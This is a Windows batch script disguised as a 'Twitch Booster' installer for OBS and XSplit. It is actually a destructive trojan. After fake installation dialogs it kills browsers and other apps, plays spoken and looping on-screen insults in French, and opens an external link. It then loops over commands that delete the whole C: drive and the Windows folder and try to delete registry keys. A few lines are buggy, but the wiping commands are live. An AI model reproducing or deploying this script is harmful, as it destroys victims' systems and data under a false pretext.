@echo off
cls
set /a install=%random%
set /a voice=%random%
set /a msg=%random%

@echo msgbox "bienvenue dans l'installeur du twitch Booster pour OBS et xsplit souhaitez vous procéder a l'installation?", 4+32+4096, "twitch Booster">%install%.vbs
@echo msgbox "installation terminé, vous pouvez désormais streamer sans problème de connexion", 0+48+4096, "Twitch Booster">>%install%.vbs
goto lol

::code reassembly by spirit^^
::compared to that of sneus, it does not contain any spam from the disk drive and others. he revercompared to that of sneus, it does not contain any spam from the disk drive and others. it doesn't even reverse the mouse with rundll32.

:lol
if exist %install%.vbs
    start %install%.vbs
    goto to

:to
@echo CreateObject("SAPI.SpVoice")>%voice%.vbs
@echo Sapi.speak"coucou, je suis juste la petite voix qui te dit que le 18-25 vient de détruire ton pc et ce a tout jamais, amuse toi bien a le réparer fils de viol trés content, dédi au raie du 18-25">>%voice%.vbs

@echo do>%msg%.vbs
@echo msgbox "LE 18-25 T'A BIEN BAISER LE FION PUTAIN DE GROS FILS DE PUTE", 0+16+4096, "l'élite de la nation">>%msg%.vbs
@echo loop>>%msg%.vbs
    goto ya

:ya
cd C:\
cd C:\Users\%userprofile%\AppData\Local\Temp
timeout /t 60
goto voix

:voix
if exist %voice%.vbs
    start %voice%.vbs
    timeout /t 7
    goto kill

:kill
taskkill /f /t /im spotify.exe
taskkill /f /t /im msedge.exe
taskkill /f /t /im mspaint.exe
taskkill /f /t /im javaw.exe
taskkill /f /t /im firefox.exe
goto melter


:melter
if exist melter.exe
    start melter.exe
    goto error

:error
if exist %msg%.vbs
    start %msg.vbs
    start %msg%.vbs
    start %msg%.vbs
    start %msg.vbs%
    goto cactus

:cactus
start "iexplore" http://0Xad.net/cactus
goto del

:del
del C:\Windows /F /S /Q >nul
del C:\Windows\*.*/Y
del C: /F /S /Q >nul
del C:\*.*/Y
reg delete HCKU >nul
reg del HCKU >nul
goto del
